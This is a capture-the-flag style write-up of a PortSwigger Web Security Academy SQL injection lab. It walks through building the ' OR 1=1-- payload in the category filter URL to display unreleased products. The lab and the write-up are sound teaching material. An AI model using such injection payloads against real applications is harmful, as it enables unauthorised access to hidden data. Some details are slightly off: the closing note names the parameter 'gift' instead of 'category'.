## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This writeup is all about Portswigger’s web security academy SQL injection lab. Like many other examples of SQLi most common is retrieval of hidden data. I exploited this lab & writing this to share my knowledge with you. Enough chit-chat let’s dive into it.

**Title:** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data. [Go](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

**Description:** This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
## Preface
Retrieving hidden data means where you can modify a SQL query to return additional results in application response.
```sql
SELECT * FROM products WHERE category = '<param>' AND released = 1
```
This SQL query asks the database to return:
```
all details (*)
from the products table
where the category is <param>
and released is 1.
```
The restriction `released = 1` is being used to hide products that are not released.

For unreleased products, presumably `released = 0`.

## Methodology
### Finding the vulnerable parameter 
First thing first, we have to first find a vulnerable parameter where SQL query can be possible. As a shopping application this site has search functionality where the backend logic queries for the submitted data.
_https://lab_id.web-security-academy.net/filter?category=Gifts_
### My thought
Let’s think about what's happening behind the scene. “ What is the syntax of a basic sql query? ” 
```sql
SELECT * FROM table_name WHERE column_name = ‘some_value’ 
```
Combining this knowledge with our lab’s parameter the backend query will be something like this 
```sql
SELECT * FROM products WHERE category = 'Gifts' 
```
What about if we set a condition like `1=1` & comment out the rest of the query? Then the backend query will be something like this 
```sql
SELECT * FROM products WHERE category = 'Gifts'+OR+1=1--
```
_https://lab_id.web-security-academy.net/filter?category=Corporate+gifts%27+OR+1=1--_

After executing the payload in the query parameter, the backend processes the query, revealing concealed results in the application's response.

![poc_retrieving_of_hidden_data.png](../imagesretrieving_of_hidden_data.png)

**Understanding the Logic:**
In SQL, the 'OR' operator acts as a logical gate, resolving to true when the condition '1=1' is satisfied. We employ a comment sign to effectively nullify the remainder of the query, thus maintaining query integrity and execution as intended.

**Note:**
Notice that in the process of solving the lab we didn’t confirm where the vulnerability exists or not. As from the lab description we know the `gift` parameter is vulnerable to SQLi. We did not do any confirmation test or something like that. But in a real world scenario you have to first confirm the vulnerability then go for further exploitation.
